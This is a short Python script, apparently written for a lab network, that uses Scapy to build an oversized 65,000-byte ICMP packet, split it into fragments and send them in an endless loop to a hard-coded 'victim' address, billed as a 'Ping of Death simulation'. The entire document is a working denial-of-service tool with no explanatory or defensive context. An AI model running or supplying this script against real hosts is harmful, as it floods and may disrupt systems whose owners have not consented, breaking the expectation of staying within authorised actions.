import time

from scapy.layers.inet import fragment, IP, ICMP
from scapy.sendrecv import send

victim_ip = "192.168.56.4"
packet_size = 65000
interval = 3

payload = b"A" * packet_size
icmp_packet = IP(dst=victim_ip)/ICMP()/payload

fragments = fragment(icmp_packet, fragsize=1400)

print(f"Starting Ping of Death simulation to {victim_ip}")
try:
    while True:
        for frag in fragments:
            send(frag, verbose=True)
        print(f"Sent oversized ICMP packet fragments to {victim_ip}")
        time.sleep(interval)
except KeyboardInterrupt:
    print("Simulation stopped by user")
